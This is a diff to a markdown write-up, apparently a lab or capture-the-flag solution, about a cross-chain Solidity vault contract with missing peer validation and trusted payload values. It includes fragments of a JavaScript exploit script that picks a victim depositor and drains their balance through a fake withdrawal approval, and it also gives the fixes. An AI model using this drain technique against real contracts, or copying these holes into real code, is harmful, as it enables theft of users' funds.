@@ -13,10 +13,15 @@ The **RivalsOappContract** has **TWO critical vulnerabilities** in its `_lzRecei
 1. **Missing Peer Validation**: Doesn't validate that withdrawal approvals come from the trusted guardian peer
 2. **Payload Manipulation**: Uses user address and amount from the payload instead of validating against the stored request
 
-**Vulnerable Code** (lines 202-224 in RivalOappContract.sol):
+**Vulnerable Code** (lines 199-226 in RivalOappContract.sol):
 
 ```solidity
 } else if (messageType == MessageType.WITHDRAWAL_APPROVAL) {
+    // 🚨 VULNERABILITY #1: No peer validation for approvals!
+    // The developer mistakenly thought the OApp base contract would handle this,
+    // but they need to explicitly validate for application-specific security logic.
+    // Any contract on the guardian chain can send fake approvals!
+
     // Decode approval with user and amount from payload
     (, bytes32 requestId, address user, uint256 amount) = abi.decode(
         _payload,
@@ -27,7 +32,7 @@ The **RivalsOappContract** has **TWO critical vulnerabilities** in its `_lzRecei
     require(!request.approved, "Already approved");
     require(request.user != address(0), "Invalid request");
 
-    // 🚨 VULNERABILITY: Uses user and amount from payload, not from stored request! 🚨
+    // 🚨 VULNERABILITY #2: Uses user and amount from payload, not from stored request! 🚨
     // Attacker can specify ANY user and ANY amount in their fake approval!
     require(balances[user] >= amount, "Insufficient balance");
 
@@ -316,24 +321,9 @@ console.log("Request ID:", requestId);
 const [users, amounts] = await vault.getActiveDepositors();
 console.log("Active depositors:", users.length);
 
-// Pick a victim (let's target the one with the most funds)
-let victimIndex = 0;
-let maxBalance = amounts[0];
-for (let i = 1; i < amounts.length; i++) {
-  if (amounts[i] > maxBalance) {
-    maxBalance = amounts[i];
-    victimIndex = i;
-  }
-}
-
-const victimAddress = users[victimIndex];
-const amountToDrain = amounts[victimIndex];
-console.log("Target victim:", victimAddress);
-console.log("Victim balance:", amountToDrain.toString());
-
-// Alternative: manually specify a victim
-// const victimAddress = "0xVictimAddressWithVaultBalance";
-// const amountToDrain = await vault.balances(victimAddress);
+// specify a victim
+const victimAddress = "0xVictimAddressWithVaultBalance";
+const amountToDrain = await vault.balances(victimAddress);
 
 const approvalOptions = Options.newOptions()
   .addExecutorLzReceiveOption(200000, 0)
@@ -499,7 +489,7 @@ function _lzReceive(
 
         // ✅ FIX 1: Verify approval came from trusted guardian peer
         require(
-            _origin.sender == peers[_origin.srcEid],
+            _origin.sender == _getPeerOrRevert(_origin.srcEid),
             "Approval must come from guardian"
         );
 
@@ -524,9 +514,9 @@ function _lzReceive(
 
 **Fix 1: Peer Validation**
 
-1. The `peers` mapping stores trusted peer addresses for each chain
-2. We check that `_origin.sender` matches the expected guardian
-3. Attacker's fake guardian won't match the trusted peer address
+1. Use `_getPeerOrRevert(_origin.srcEid)` to get the trusted peer address for the source chain
+2. Check that `_origin.sender` matches the expected guardian peer
+3. Attacker's fake guardian won't match the trusted peer address registered via `setPeer()`
 
 **Fix 2: Payload Validation**
 
@@ -535,35 +525,11 @@ function _lzReceive(
 3. Use stored values for the actual transfer, never trust payload values
 4. Even if an attacker could send a fake approval, they can't change the withdrawal recipient or amount
 
-### Alternative: Use OApp's Built-in Validation
+### Important Note About OApp's Built-in Validation
 
-LayerZero's `OApp` base contract provides peer validation automatically if you use the right pattern:
+While the OApp base contract's `lzReceive()` function validates peers automatically, the **vulnerability in this contract** is that the `WITHDRAWAL_APPROVAL` handler doesn't perform its **own** peer validation. The contract incorrectly handles both message types the same way, when it should only accept approval messages from a specific trusted guardian peer.
 
-```solidity
-// The OApp base contract already has peer validation in _getPeer()
-// But it's only used if you properly structure your receive logic
-
-function _lzReceive(
-    Origin calldata _origin,
-    bytes32 _guid,
-    bytes calldata _payload,
-    address _executor,
-    bytes calldata _extraData
-) internal override {
-    // The base OApp.lzReceive() already validates the peer before calling this
-    // So messages can only come from configured peers
-    // But we need to additionally verify it's the RIGHT peer for approvals
-
-    MessageType messageType = abi.decode(_payload, (MessageType));
-
-    if (messageType == MessageType.WITHDRAWAL_APPROVAL) {
-        // For approvals, specifically verify it's from the guardian peer
-        bytes32 expectedGuardian = peers[GUARDIAN_CHAIN_EID];
-        require(_origin.sender == expectedGuardian, "Not from guardian");
-        // ... rest of logic
-    }
-}
-```
+The fix explicitly validates `_origin.sender` for approval messages to ensure they come from the legitimate guardian contract, not just any registered peer.
 
 ---
 
